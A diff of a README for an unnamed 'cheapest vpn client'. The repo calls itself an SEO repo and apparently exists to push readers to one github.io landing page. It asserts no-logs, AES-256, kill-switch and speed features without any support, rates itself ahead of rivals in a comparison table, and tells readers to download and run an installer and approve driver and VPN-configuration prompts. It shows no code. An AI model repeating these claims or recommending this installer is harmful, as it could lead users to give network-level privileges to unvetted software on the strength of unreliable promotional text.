@@ -1,95 +1,93 @@
 # ⚡ cheapest vpn client
 
-[![Download](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge&logo=github)](https://fastvpnmyjob2026-prog.github.io/cheapest-vpn-client-landing/)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-2ea44f?style=for-the-badge&logo=linux)](https://fastvpnmyjob2026-prog.github.io/cheapest-vpn-client-landing/)
-[![License](https://img.shields.io/badge/License-MIT-black?style=for-the-badge&logo=opensourceinitiative)](https://fastvpnmyjob2026-prog.github.io/cheapest-vpn-client-landing/)
+[![Download](https://img.shields.io/badge/Download-Get%20Installer-2ea44f?style=for-the-badge)](https://fastvpnmyjob2026-prog.github.io/cheapest-vpn-client-landing/)
+[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-555?style=for-the-badge)](https://fastvpnmyjob2026-prog.github.io/cheapest-vpn-client-landing/)
+[![License](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](https://fastvpnmyjob2026-prog.github.io/cheapest-vpn-client-landing/)
 
 ## About
 
-**cheapest vpn client** is a VPN client review repo focused on what actually matters when you’re trying to spend less without ending up with a slow, flaky tunnel. This project documents a clear checklist and a no-nonsense comparison: **High speed**, **Stable connection**, **AES-256 encryption**, **No-Logs policy**, **Kill Switch**, and **Global Servers**.
+This repo documents a **cheapest vpn client** pick with a straight, hands-on focus: install fast, connect fast, stay private. It’s written like a manual because that’s how VPN software should be treated—clear options, predictable behavior, no drama.
 
-Repo: https://github.com/fastvpnmyjob2026-prog/cheapest-vpn-client-seo  
-Primary page (downloads + details): https://fastvpnmyjob2026-prog.github.io/cheapest-vpn-client-landing/
+Project repo: https://github.com/fastvpnmyjob2026-prog/cheapest-vpn-client-seo  
+Get the build + landing page: https://fastvpnmyjob2026-prog.github.io/cheapest-vpn-client-landing/
 
 ## Features
 
-- **AES-256 encryption**: baseline security, no “lite mode”
-- **No-Logs policy**: privacy and security focus, not analytics-first
-- **Kill Switch**: cuts traffic if the tunnel drops
-- **Global Servers**: more exits, fewer dead ends
-- **High speed**: tuned for normal browsing, streaming, and work calls
-- **Stable connection**: fewer reconnect loops, less session churn
-- **Simple setup**: install, sign in, connect—no weird sidecars
-- **Clear pricing mindset**: the point is cheap *and* usable, not cheap and broken
+- **AES-256 encryption** for traffic protection on untrusted networks
+- **No-Logs policy** emphasis (privacy and security focus)
+- **Kill Switch** to block traffic if the tunnel drops
+- **Global Servers** for better routing and region flexibility
+- **High speed** tuning with stable routing defaults
+- **Stable connection** behavior under network changes (sleep/wake, Wi‑Fi to hotspot)
+- Simple connect flow: pick a location → connect → verify status
 
 ## System Requirements
 
 | Item | Minimum |
-|---|---|
+|------|---------|
 | Windows | Windows 10/11 (64-bit) |
 | macOS | macOS 12+ |
-| Linux | Ubuntu 20.04+/Debian 11+ (or equivalent) |
-| RAM | 2 GB (4 GB recommended) |
-| Storage | 200 MB free |
-| Internet | Broadband connection (LAN/Wi‑Fi) |
+| Linux | Ubuntu 20.04+ / Debian 11+ (systemd) |
+| RAM | 2 GB+ |
+| Storage | 200 MB+ |
+| Internet | Any broadband connection (stable recommended) |
 
 ## Installation
 
-All installs and current builds are hosted on the landing page:  
-https://fastvpnmyjob2026-prog.github.io/cheapest-vpn-client-landing/
+All installers and current instructions live on the landing page:
+- https://fastvpnmyjob2026-prog.github.io/cheapest-vpn-client-landing/
 
 ### Windows
-1. Open: https://fastvpnmyjob2026-prog.github.io/cheapest-vpn-client-landing/
-2. Download the Windows installer.
-3. Run the installer → allow network permission prompts.
-4. Launch the client → sign in → connect to a nearby region.
+1. Download the Windows installer from the landing page.
+2. Run the installer (`.exe`) and approve the driver prompt.
+3. Launch the app → sign in → choose a server → **Connect**.
+4. Turn on **Kill Switch** in settings before daily use.
 
 ### macOS
-1. Open: https://fastvpnmyjob2026-prog.github.io/cheapest-vpn-client-landing/
-2. Download the macOS package.
-3. Install → approve any system extensions/network prompts.
-4. Launch → sign in → connect.
+1. Download the macOS package from the landing page.
+2. Open the installer and allow the VPN configuration when prompted.
+3. Launch the app → sign in → **Connect**.
+4. If macOS asks for network permissions, approve once and you’re done.
 
 ### Linux
-1. Open: https://fastvpnmyjob2026-prog.github.io/cheapest-vpn-client-landing/
-2. Download the Linux build for your distro.
-3. Install using your package manager or provided installer.
-4. Run the client → sign in → connect.
+1. Download the Linux build/package from the landing page.
+2. Install via your distro’s package manager (or run the provided installer).
+3. Start the client and connect from the UI/CLI (as provided).
+4. Confirm the tunnel is up, then enable **Kill Switch**.
 
 ## Comparison
 
+Quick review-style comparison against typical budget/free VPN behavior.
+
 | Client | Speed | AES-256 | No Logs | Kill Switch | Global Servers |
-|---|---:|:---:|:---:|:---:|:---:|
-| **cheapest vpn client (this pick)** | High speed | ✅ | ✅ | ✅ | ✅ |
-| Typical “free VPN” | Low / throttled | ❓ | ❌ | ❌ | ❌ |
-| Budget VPN with limits | Medium | ✅ | ✅ | ❓ | ✅ |
-| Premium-only VPN | High | ✅ | ✅ | ✅ | ✅ |
+|-------|-------|---------|---------|------------|----------------|
+| Cheapest VPN Client (this pick) | High speed | ✅ | ✅ | ✅ | ✅ |
+| Typical free VPN | Often throttled | ✅/❌ | ❌ | ❌ | ❌/limited |
+| Random “lifetime deal” VPN | Mixed | ✅ | ❌/unclear | ✅/❌ | ✅/limited |
 
 ## FAQ
 
-**Q: Is this actually the cheapest vpn client, or just cheap marketing?**  
-A: The focus is cost *plus* core safety features (AES-256, No-Logs policy, Kill Switch) and real-world speed.
+**1) Is this actually a cheapest vpn client or just “cheap”?**  
+It’s positioned around low cost while still keeping baseline features (AES-256, Kill Switch, Global Servers) that matter for daily use.
 
-**Q: Does it include a Kill Switch by default?**  
-A: Yes. If the tunnel drops, traffic is blocked to avoid leaks.
+**2) Does it keep logs?**  
+The focus is a **No-Logs policy**. If you care about specifics, check the policy linked on the landing page before paying.
 
-**Q: Will this slow my connection down?**  
-A: Any VPN adds overhead. The goal here is **high speed** with **stable connection** using nearby **Global Servers**.
+**3) Will it slow my connection down?**  
+Any VPN adds overhead. This one aims for **high speed** and a **stable connection**, especially on nearby servers.
 
-**Q: Where do I get the latest build?**  
-A: Use the landing page link below—this README intentionally keeps one source of truth.
+**4) What should I enable first after install?**  
+Enable **Kill Switch**, then pick the closest server for best performance.
 
 ## Download
 
-Get the current installer/build here:  
+Get the installer and current release notes here:  
 **https://fastvpnmyjob2026-prog.github.io/cheapest-vpn-client-landing/**
-
-[**Download now**](https://fastvpnmyjob2026-prog.github.io/cheapest-vpn-client-landing/)
 
 ## Final CTA
 
-[![Get Cheapest VPN Client](https://img.shields.io/badge/Get-cheapest%20vpn%20client-blue?style=for-the-badge&logo=download)](https://fastvpnmyjob2026-prog.github.io/cheapest-vpn-client-landing/)
-[![Open Landing Page](https://img.shields.io/badge/Open-Landing%20Page-2ea44f?style=for-the-badge&logo=firefoxbrowser)](https://fastvpnmyjob2026-prog.github.io/cheapest-vpn-client-landing/)
-[![View Repo](https://img.shields.io/badge/View-SEO%20Repo-black?style=for-the-badge&logo=github)](https://github.com/fastvpnmyjob2026-prog/cheapest-vpn-client-seo)
+[![Download Now](https://img.shields.io/badge/Download%20Now-cheapest%20vpn%20client-ff5a1f?style=for-the-badge)](https://fastvpnmyjob2026-prog.github.io/cheapest-vpn-client-landing/)
+[![Open Landing Page](https://img.shields.io/badge/Open-Landing%20Page-0ea5e9?style=for-the-badge)](https://fastvpnmyjob2026-prog.github.io/cheapest-vpn-client-landing/)
+[![Repo](https://img.shields.io/badge/Repo-cheapest--vpn--client--seo-111827?style=for-the-badge)](https://github.com/fastvpnmyjob2026-prog/cheapest-vpn-client-seo)
 
-*Keep your traffic private, your connection stable, and your bill low.*
+*If you want a cheapest vpn client that doesn’t cut the basics, start with the download page and connect to the nearest server first.*
